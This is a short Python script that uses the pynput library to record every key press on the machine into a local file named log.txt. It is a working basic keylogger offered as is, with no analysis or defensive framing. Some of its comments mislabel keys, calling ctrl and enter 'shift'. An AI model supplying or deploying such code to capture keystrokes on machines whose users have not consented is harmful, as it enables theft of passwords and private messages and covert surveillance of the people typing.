# Goal: store the key strokes into a text file
from pynput.keyboard import Listener 

def write_to_file(key):
    letter =str(key)
    # Removing all the " ' "
    letter = letter.replace("'","")

    # Can adjust the conditions of key codes 
    # Removing the keyword space and add in an actual space
    if letter == "Key.space":
        letter = " " 

    # Removing the keyword shift and replace it as nothing
    if letter == "Key.shift_r":
        letter = ""  

    # Removing the keyword shift and replace it as nothing
    if letter == "Key.ctrl_l":
        letter = ""

    # Removing the keyword shift and replace it as a new line
    if letter == "Key.enter":
        letter = "\n"  

    # Writing to the file 
    with open("log.txt", "a") as file:
        file.write(letter)

with Listener(on_press=write_to_file) as l:
    l.join() # Join the keystrokes together